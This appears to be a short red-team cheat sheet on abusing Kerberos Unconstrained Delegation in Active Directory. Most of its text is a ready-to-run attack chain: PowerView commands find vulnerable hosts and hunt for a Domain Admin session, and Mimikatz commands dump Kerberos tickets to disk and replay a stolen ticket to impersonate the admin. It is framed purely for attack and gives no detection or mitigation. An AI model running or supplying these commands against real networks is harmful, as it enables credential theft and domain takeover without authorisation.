**WHAT IS THIS?:**

If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value target or DA (Domain Admin) to connect to it, steal his TGT then pass-the-ticket and impersonate him!

# Using PowerView
- Discover domain joined computers that have Unconstrained Delegation enabled:
```powershell
Get-NetComputer -UnConstrained
```
- List tickets and check if a DA or some High Value target has stored its TGT:
```powershell
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> UserName <UserToMonitorFor> -Delay <WaitInterval> -Verbose
```
- Dump the tickets to disk:
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
- Impersonate the user using pass-the-ticket attack:
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```
**Note:** We can also use Rubeus!
